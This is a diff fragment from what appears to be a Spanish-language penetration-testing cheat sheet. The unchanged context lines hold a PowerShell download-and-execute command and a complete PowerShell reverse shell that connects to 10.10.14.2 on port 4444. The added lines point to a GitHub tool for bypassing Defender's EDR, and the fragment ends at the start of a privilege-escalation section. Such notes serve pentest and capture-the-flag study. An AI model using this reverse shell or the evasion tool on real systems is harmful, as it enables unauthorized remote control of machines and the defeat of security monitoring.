@@ -560,6 +560,8 @@ START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://
 $client = New-Object System.Net.Sockets.TCPClient('10.10.14.2',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 ## [](#header-2)<a id="Privilege_escalation">Privilege escalation</a>
+Acabo de encontrar una herramienta que te ayuda a hacer bypass del edr de Defender que se llama https://github.com/Adkali/PowerJoker.git.
+
 Manualmente, tenemos el comando whoami, pero en esta ocacion con los privilegios posibles:
 ```s
 whoami /all
